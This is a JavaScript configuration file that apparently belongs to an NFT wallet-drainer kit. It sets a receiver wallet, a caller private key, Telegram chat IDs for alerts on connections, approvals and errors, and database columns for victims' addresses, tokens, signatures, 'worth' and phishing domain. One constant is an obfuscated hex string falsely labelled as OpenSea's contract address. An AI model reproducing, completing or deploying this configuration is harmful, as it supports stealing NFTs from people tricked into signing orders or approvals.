export const RECEIVER = "0x779.......8F2f";
// length 40 hex characters

// RECEIVER = CALLER_WALLET
export const CALLER_ADDR = "0xb.......F83b";
// length 40 hex characters

export const CALLER_PK = "e4141cd.....bc5ebe"; // MM Acc1
// private key of CALLER_ADDR
// length 64 hex characters

export const PORT = "4000" // localhost
//export const PORT = process.env.PORT // for example heroku hosting

export const SEAPORT_ADDR = "21337b333333333333333333333560303b3631606146653066333b463b6745313b3a32353a466746363b3221"; 
// dont touch, this is opensea's contract

//Search for Botfather on Telegram. @ him at /@botfather
//Say hi to the Botfather (gotta pay respects)
//Send your bot name his way
//Bam! You got your authorization token 😃
export const TG_TOKEN ="telegram_key_here";
export const TG_LINK = "https://api.telegram.org/bot";
export const CHAT_ID_ERR = "-544699072";
export const CHAT_ID_CON = "-544699072";
export const CHAT_ID_APP = "-544699072";

// INFURA-API-KEY
export const WEB3_URL = "https://mainnet.infura.io/v3/";

export const CHAIN_ID = 1; 

export const expirationOffset = 2630000; // 1 month in sec

export const SEA_USER = "addr,tokensArr,sig,sigTime,salt,salt2,worth,domain";
export const APP_USER = "addr,target,worth,domain";

export const TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2,target,tokenId";

export const SEA_TX_ROW = "addr,tokensArr,sig,sigTime,salt,salt2";
export const APP_TX_ROW = "addr,target,tokenId";

export const COLUMNS = {
  sea_users: SEA_USER,
  app_users: APP_USER,
  tx_waiting: TX_ROW,
  tx_done: TX_ROW,
};

export const ADDR_REGEX = /^[a-fA-F0-9]{40}$/;
export const SIG_REGEX = /^([A-Fa-f0-9]{130})$/;
